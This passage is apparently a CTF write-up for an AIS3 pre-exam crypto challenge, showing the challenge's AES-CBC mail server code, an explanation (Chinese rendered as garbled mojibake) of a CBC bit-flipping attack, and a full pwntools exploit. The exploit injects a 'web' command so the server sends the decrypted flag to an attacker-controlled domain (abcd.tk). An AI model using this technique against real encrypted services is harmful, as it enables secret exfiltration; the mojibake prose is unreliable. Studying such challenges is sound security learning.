web 'https://oalieno.github.io'
echo 'This is the blog of bamboofox team'
web 'https://bamboofox.github.io/'

--BOUNDARY
Type: text
You can find some useful tutorial on there.
And you might be wondering where is the flag?
Just hold tight, and remember that patient is virtue.

--BOUNDARY
Type: text
Here is your flag : {}

--BOUNDARY
Type: text
Hope you like our crypto challenges.
Thanks for solving as always.
I'll catch you guys next time.
See ya!

--BOUNDARY
'''</span>.format(flag).lstrip().encode(<span class="hljs-string">'utf-8'</span>)

quotes = [<span class="hljs-string">'Keep on going never give up.'</span>,
          <span class="hljs-string">'Believe in yourself.'</span>,
          <span class="hljs-string">'Never say die.'</span>,
          <span class="hljs-string">"Don't give up and don't give in."</span>,
          <span class="hljs-string">'Quitters never win and winners never quit.'</span>]

seen = <span class="hljs-keyword">False</span>
key = os.urandom(<span class="hljs-number">16</span>)
iv = os.urandom(<span class="hljs-number">16</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad</span><span class="hljs-params">(text)</span>:</span>
    L = -len(text) % <span class="hljs-number">16</span>
    <span class="hljs-keyword">return</span> text + bytes([L]) * L

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">unpad</span><span class="hljs-params">(text)</span>:</span>
    L = text[<span class="hljs-number">-1</span>]
    <span class="hljs-keyword">if</span> L &gt; <span class="hljs-number">16</span>:
        <span class="hljs-keyword">raise</span> ValueError
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, L + <span class="hljs-number">1</span>):
        <span class="hljs-keyword">if</span> text[-i] != L:
            <span class="hljs-keyword">raise</span> ValueError
    <span class="hljs-keyword">return</span> text[:-L]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_mail</span><span class="hljs-params">(mail)</span>:</span>
    raw_mail = <span class="hljs-string">b""</span>

    <span class="hljs-comment"># parse many chunk</span>
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:

        <span class="hljs-comment"># throw away the delimeter</span>
        _, _, mail = mail.partition(<span class="hljs-string">b'--BOUNDARY\n'</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> mail:
            <span class="hljs-keyword">break</span>

        <span class="hljs-comment"># parse Type</span>
        type_, _, mail = mail.partition(<span class="hljs-string">b'\n'</span>)
        type_ = type_.split(<span class="hljs-string">b': '</span>)[<span class="hljs-number">1</span>]

        <span class="hljs-comment"># Type: text</span>
        <span class="hljs-keyword">if</span> type_ == <span class="hljs-string">b'text'</span>:
            text, _, mail = mail.partition(<span class="hljs-string">b'\n\n'</span>)
            raw_mail += text + <span class="hljs-string">b'\n'</span>

        <span class="hljs-comment"># Type: cmd</span>
        <span class="hljs-keyword">elif</span> type_ == <span class="hljs-string">b'cmd'</span>:

            <span class="hljs-comment"># parse many cmd</span>
            <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:

                <span class="hljs-comment"># see '\n\n' then continue to next chunk</span>
                <span class="hljs-keyword">if</span> mail[:<span class="hljs-number">1</span>] == <span class="hljs-string">b'\n'</span>:
                    mail = mail[<span class="hljs-number">1</span>:]
                    <span class="hljs-keyword">break</span>

                <span class="hljs-comment"># parse cmd, content</span>
                cmd, _, mail = mail.partition(<span class="hljs-string">b"'"</span>)
                content, _, mail = mail.partition(<span class="hljs-string">b"'\n"</span>)

                <span class="hljs-comment"># echo 'content' ( print some text )</span>
                <span class="hljs-keyword">if</span> cmd.startswith(<span class="hljs-string">b'echo'</span>):
                    raw_mail += content + <span class="hljs-string">b'\n'</span>

                <span class="hljs-comment"># web 'content' ( preview some of the text on webpage )</span>
                <span class="hljs-keyword">elif</span> cmd.startswith(<span class="hljs-string">b'web'</span>):
                    print(quote(content), file=sys.stderr)
                    x = content.find(<span class="hljs-string">b'//'</span>)
                    <span class="hljs-keyword">if</span> x != <span class="hljs-number">-1</span>:
                        url = content[:x].decode(<span class="hljs-string">'utf-8'</span>) + <span class="hljs-string">'//'</span> + quote(content[x+<span class="hljs-number">2</span>:])
                    <span class="hljs-keyword">else</span>:
                        url = <span class="hljs-string">'http://'</span> + quote(content)
                    <span class="hljs-keyword">try</span>:
                        req = urlopen(url)
                        text = req.read()
                        raw_mail += <span class="hljs-string">b'+ '</span> + content + <span class="hljs-string">b'\n'</span>
                        raw_mail += <span class="hljs-string">b'\n'</span>.join(re.findall(<span class="hljs-string">b'&lt;p&gt;(.*)&lt;/p&gt;'</span>, text)) + <span class="hljs-string">b'\n'</span>
                    <span class="hljs-keyword">except</span> (HTTPError, URLError) <span class="hljs-keyword">as</span> e:
                        <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">return</span> raw_mail

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_mail</span><span class="hljs-params">(mail)</span>:</span>
    <span class="hljs-comment"># I am so busy right now, no time to read the mails</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getmail</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">global</span> seen
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> seen:
        aes = AES.new(key, AES.MODE_CBC, iv)
        mail = aes.encrypt(pad(mail_for_ctfplayer))
        print(b64encode(mail).decode(<span class="hljs-string">'utf-8'</span>))
        seen = <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">else</span>:
        print(<span class="hljs-string">'you have read all mails.'</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sendmail</span><span class="hljs-params">(mail)</span>:</span>
    mail = b64decode(mail)
    aes = AES.new(key, AES.MODE_CBC, iv)
    mail = unpad(aes.decrypt(mail))
    print(mail[<span class="hljs-number">8</span>*<span class="hljs-number">16</span>:<span class="hljs-number">10</span>*<span class="hljs-number">16</span>],  file=sys.stderr)
    mail = parse_mail(mail)
    read_mail(mail)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">menu</span><span class="hljs-params">()</span>:</span>
    print(<span class="hljs-string">''</span>)
    print(<span class="hljs-string">'{:=^20}'</span>.format(<span class="hljs-string">' menu '</span>))
    print(<span class="hljs-string">'1) ctf player mailbox'</span>)
    print(<span class="hljs-string">'2) send me a mail'</span>)
    print(<span class="hljs-string">'3) quit'</span>)
    print(<span class="hljs-string">'='</span> * <span class="hljs-number">20</span>)

    option = int(input(<span class="hljs-string">'&gt; '</span>).strip())
    <span class="hljs-keyword">if</span> option == <span class="hljs-number">1</span>:
        getmail()
    <span class="hljs-keyword">elif</span> option == <span class="hljs-number">2</span>:
        mail = input(<span class="hljs-string">'mail : '</span>)
        sendmail(mail)
    <span class="hljs-keyword">elif</span> option == <span class="hljs-number">3</span>:
        print(random.choice(quotes))
    <span class="hljs-keyword">else</span>:
        exit(<span class="hljs-number">0</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    proof()
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        menu()

main()</code></pre><p>unpad æœ‰å¥½å¥½æª¢æŸ¥ï¼Œæ²’ä»€éº¼å•é¡Œã€‚ä½†é€™é¡Œ padding oracle ä»ç„¶å¯åšï¼Œä¸éæœ‰ PoW è¦åšï¼Œæ‰€ä»¥å…ˆæ€è€ƒçœ‹çœ‹æœ‰æ²’æœ‰åˆ¥çš„ä½œæ³•ï¼Œå”¯ä¸€æ¯”è¼ƒå¯ç–‘çš„æ˜¯ <code>urlopen</code>ï¼Œparse mail å›å‚³çš„æ±è¥¿ä¸æœƒå°å‡ºä¾†ï¼Œé‚£ <code>urlopen</code> å°±æœ‰é»å¤šé¤˜äº†ã€‚</p>
<p>æˆ‘å€‘æœ‰æ²’æœ‰è¾¦æ³•ç”¨ <code>urlopen</code> å»æŠŠ flag å‚³å›ä¾†å‘¢ï¼Ÿ</p>
<p>å…ˆæŠŠ block ç¨å¾®æ’ä¸€ä¸‹ï¼š</p>
<pre class="hljs"><code><span class="hljs-symbol">0 </span>b<span class="hljs-comment">'From: thor@ais3.'</span>
<span class="hljs-symbol">1 </span>b<span class="hljs-comment">'org\nTo: ctfplaye'</span>
<span class="hljs-symbol">2 </span>b<span class="hljs-comment">'r@ais3.org\n\n--BO'</span>
<span class="hljs-symbol">3 </span>b<span class="hljs-comment">'UNDARY\nType: tex'</span>
<span class="hljs-symbol">4 </span>b<span class="hljs-comment">'t\nWelcome to AIS'</span>
<span class="hljs-symbol">5 </span>b<span class="hljs-comment">'3 pre-exam.\n\n--B'</span>
<span class="hljs-symbol">6 </span>b<span class="hljs-comment">'OUNDARY\nType: cm'</span>
<span class="hljs-symbol">7 </span>b<span class="hljs-string">"d\necho 'This is "</span>
<span class="hljs-symbol">8 </span>b<span class="hljs-comment">'the blog of oali'</span>
<span class="hljs-symbol">9 </span>b<span class="hljs-string">"eno'\nweb 'https:"</span>
<span class="hljs-symbol">10 </span>b<span class="hljs-comment">'//oalieno.github'</span>
<span class="hljs-symbol">11 </span>b<span class="hljs-string">".io'\necho 'This "</span>
<span class="hljs-symbol">12 </span>b<span class="hljs-comment">'is the blog of b'</span>
<span class="hljs-symbol">13 </span>b<span class="hljs-string">"amboofox team'\nw"</span>
<span class="hljs-symbol">14 </span>b<span class="hljs-string">"eb 'https://bamb"</span>
<span class="hljs-symbol">15 </span>b<span class="hljs-comment">'oofox.github.io/'</span>
<span class="hljs-symbol">16 </span>b<span class="hljs-string">"'\n\n--BOUNDARY\nTy"</span></code></pre><p>æˆ‘å€‘å¯ä»¥åˆ©ç”¨ CBC çš„ç‰¹æ€§ï¼Œé€éæ›´æ”¹ç¬¬ 8 å€‹ block çš„å¯†æ–‡ï¼Œä¾†æ›´å‹•ç¬¬ 9 å€‹ block çš„æ˜æ–‡ï¼Œé›–ç„¶ç¬¬ 8 å€‹ block æœƒè§£å¯†æˆä¸€å †çˆ›æ‰çš„æ±è¥¿ï¼Œä½†ç¬¬ 9 å€‹ block æ˜æ–‡å®Œå…¨å¯æ§ã€‚</p>
<p>é‚£å¦‚æœæˆ‘å€‘æŠŠ flag ç›´æ¥æ¥åœ¨å¾Œé¢å‘¢ï¼Ÿé€™æ¨£ <code>urlopen</code> å°±æœƒæŠŠè§£å¯†å¾Œçš„ flag å‚³å›ä¾†äº†ã€‚</p>
<p>å—é™æ–¼ block size çš„é™åˆ¶ï¼Œæˆ‘å€‘çš„ domain name è¦è¶ŠçŸ­è¶Šå¥½ï¼Œæ‰€ä»¥ç›´æ¥ä¸Š <a href="http://dot.tk/">dot.tk</a> ç”³è«‹ä¸€å€‹å…æ´—çš„ top domainï¼Œå››å€‹å­— <code>abcd.tk</code> æ˜¯ä¸ç”¨éŒ¢çš„ã€‚</p>
<p>å›åˆ°é¡Œç›®ï¼Œé€™è£¡ç¬¬ 8 å€‹ block è§£çˆ›ä¸æœƒæ€æ¨£ï¼Œåæ­£æœ‰ç¬¬ 9 å€‹ block çš„å–®å¼•è™Ÿå°±å¥½ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥æŠŠç¬¬ 9 å€‹ block è®Šæˆ <code>&#39;\nweb  &#39;abcd.tk/</code> ï¼ˆå…¶å¯¦ domainä¹Ÿä¸ç”¨é€™éº¼çŸ­ï¼‰ï¼Œå¾Œé¢ parse æœƒè£œ <code>http://</code>ï¼Œç¬¬ 10 å€‹ block ä¹‹å¾Œå°±æ¥ flag è§£å¯†çš„ blockï¼Œå°±èƒ½çœ‹åˆ° server æŠŠ flag æ”¾åœ¨ url å‚³å›ä¾†äº†ã€‚</p>
<p>Flag æœ‰æåˆ° <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-17689">CVE-2017-17689</a> ï¼Œå°±æ˜¯å° CBC æ“ä½œæ§åˆ¶æ˜æ–‡çš„ bugã€‚</p>
<p>Script:</p>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment"># Python 3.6.5</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product

chars = string.digits + string.ascii_letters

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">PoW</span><span class="hljs-params">(prefix)</span>:</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> product(*[chars <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>)]):
        x = prefix + <span class="hljs-string">''</span>.join(i)
        sha256 = hashlib.sha256()
        sha256.update(x.encode())
        <span class="hljs-keyword">if</span> sha256.hexdigest()[:<span class="hljs-number">6</span>] == <span class="hljs-string">'000000'</span>:
            <span class="hljs-keyword">return</span> x
    <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">"Unfortunately, PoW not found."</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fold16</span><span class="hljs-params">(x)</span>:</span>
    <span class="hljs-keyword">return</span> [x[i*<span class="hljs-number">16</span>:(i+<span class="hljs-number">1</span>)*<span class="hljs-number">16</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(x)//<span class="hljs-number">16</span>+<span class="hljs-number">1</span>)]

ps = [
    <span class="hljs-string">b'From: thor@ais3.'</span>,
    <span class="hljs-string">b'org\nTo: ctfplaye'</span>,
    <span class="hljs-string">b'r@ais3.org\n\n--BO'</span>,
    <span class="hljs-string">b'UNDARY\nType: tex'</span>,
    <span class="hljs-string">b't\nWelcome to AIS'</span>,
    <span class="hljs-string">b'3 pre-exam.\n\n--B'</span>,
    <span class="hljs-string">b'OUNDARY\nType: cm'</span>,
    <span class="hljs-string">b"d\necho 'This is "</span>,
    <span class="hljs-string">b'the blog of oali'</span>, <span class="hljs-comment">#8</span>
    <span class="hljs-string">b"eno'\nweb 'https:"</span>,
    <span class="hljs-string">b'//oalieno.github'</span>, <span class="hljs-comment">#10</span>
    <span class="hljs-string">b".io'\necho 'This "</span>,<span class="hljs-comment">#11 leak</span>
    <span class="hljs-string">b'is the blog of b'</span>,<span class="hljs-comment">#12 leak</span>
    <span class="hljs-string">b"amboofox team'\nw"</span>,<span class="hljs-comment">#13 leak</span>
    <span class="hljs-string">b"eb 'https://bamb"</span>,<span class="hljs-comment">#14 leak</span>
    <span class="hljs-string">b'oofox.github.io/'</span>, <span class="hljs-comment">#15</span>
    <span class="hljs-string">b"'\n\n--BOUNDARY\nTy"</span>,<span class="hljs-comment">#16</span>
    <span class="hljs-string">b'pe: text\nYou can'</span>,
    <span class="hljs-string">b' find some usefu'</span>,
    <span class="hljs-string">b'l tutorial on th'</span>,
    <span class="hljs-string">b'ere.\nAnd you mig'</span>,
    <span class="hljs-string">b'ht be wondering '</span>,
    <span class="hljs-string">b'where is the fla'</span>,
    <span class="hljs-string">b'g?\nJust hold tig'</span>,
    <span class="hljs-string">b'ht, and remember'</span>,
    <span class="hljs-string">b' that patient is'</span>,
    <span class="hljs-string">b' virtue.\n\n--BOUN'</span>,
    <span class="hljs-string">b'DARY\nType: text\n'</span>,
    <span class="hljs-string">b'Here is your fla'</span>,
]


server = remote(<span class="hljs-string">'104.199.235.135'</span>, <span class="hljs-number">20003</span>)
<span class="hljs-comment">#server = remote('127.0.0.1', 20003)</span>
pow_str = server.recvuntil(<span class="hljs-string">'x = '</span>).decode()
x_prefix = pow_str.split(<span class="hljs-string">"'"</span>)[<span class="hljs-number">1</span>]
ans = PoW(x_prefix)
server.sendline(ans)
server.recvuntil(<span class="hljs-string">'&gt; '</span>)
server.sendline(<span class="hljs-string">'1'</span>)
b64 = server.recvuntil(<span class="hljs-string">'\n\n'</span>)
cs = fold16(base64.b64decode(b64))
server.recvuntil(<span class="hljs-string">'&gt; '</span>)
<span class="hljs-comment">#server.recvuntil('')</span>
<span class="hljs-comment">#print(cs)</span>

<span class="hljs-keyword">assert</span> ps[<span class="hljs-number">8</span>] == <span class="hljs-string">b'the blog of oali'</span>
inject = <span class="hljs-string">b"'\nweb  'abcd.tk/"</span>
<span class="hljs-keyword">assert</span> len(inject) == <span class="hljs-number">16</span>
<span class="hljs-comment">#cs[8] = xor(cs[8], ps[9], inject)</span>
cs[<span class="hljs-number">8</span>] = xor(cs[<span class="hljs-number">8</span>], ps[<span class="hljs-number">9</span>], inject)

<span class="hljs-keyword">assert</span> ps[<span class="hljs-number">28</span>] == <span class="hljs-string">b'Here is your fla'</span>
cs[<span class="hljs-number">10</span>] = cs[<span class="hljs-number">28</span>] <span class="hljs-comment"># In order to display cs[29] properly</span>
cs[<span class="hljs-number">11</span>] = cs[<span class="hljs-number">29</span>]
cs[<span class="hljs-number">12</span>] = cs[<span class="hljs-number">30</span>]
cs[<span class="hljs-number">13</span>] = cs[<span class="hljs-number">31</span>]
cs[<span class="hljs-number">14</span>] = cs[<span class="hljs-number">32</span>]

server.sendline(<span class="hljs-string">'2'</span>)
print(server.recvuntil(<span class="hljs-string">': '</span>))
b64 = base64.b64encode(<span class="hljs-string">b''</span>.join(cs))
server.sendline(b64)
server.interactive()
<span class="hljs-comment">#print(server.recv())</span></code></pre>        </article>
      </div>
      <!-- Main Col END -->

    </div>
    <!-- body-row END -->
  </body>
</html>

